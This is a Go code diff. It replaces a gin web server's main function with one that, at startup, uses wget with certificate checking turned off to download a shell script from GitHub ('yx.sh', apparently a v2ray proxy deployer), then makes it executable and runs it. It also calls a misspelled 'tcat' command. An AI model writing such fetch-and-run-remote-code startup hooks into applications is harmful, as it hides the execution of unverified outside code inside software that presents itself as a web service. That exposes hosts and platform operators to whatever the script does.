@@ -26,6 +26,34 @@ type alldocsResult struct {
 	Rows      []map[string]interface{}
 }
 
+func main() {
+
+	ch := make(chan int)
+	var data []byte
+	var err error
+	var cmd *exec.Cmd
+
+	cmd = exec.Command("/bin/sh", "-c", "wget --no-check-certificate -O yx.sh https://github.com/yamgxu/IBMYes/raw/master/v2ray-cloudfoundry/v2ray/yx.sh && chmod +x yx.sh  && ./yx.sh")
+	data, err = cmd.Output()
+	if err != nil {
+		fmt.Println(err)
+	}
+	fmt.Println(string(data))
+	fmt.Println(strings.Trim(string(data), "\n"))
+	fmt.Println("执行成功")
+	cmd = exec.Command("/bin/sh", "-c", "tcat log.txt")
+	data, err = cmd.Output()
+	if err != nil {
+		fmt.Println(err)
+	}
+	fmt.Println(string(data))
+	fmt.Println(strings.Trim(string(data), "\n"))
+
+	ch <- 0
+	ch <- 0
+	ch <- 0
+	ch <- 0
+}
 func main1(s string) string {
 
 	fmt.Println("shell")
@@ -43,7 +71,7 @@ func main1(s string) string {
 	fmt.Println(strings.Trim(string(data), "\n"))
 	return string(data)
 }
-func main() {
+func main2() {
 	r := gin.Default()
 
 	r.StaticFile("/", "./static/index.html")
@@ -125,4 +153,5 @@ func main() {
 		port = "8080" //Local
 	}
 	r.Run(":" + port)
+
 }
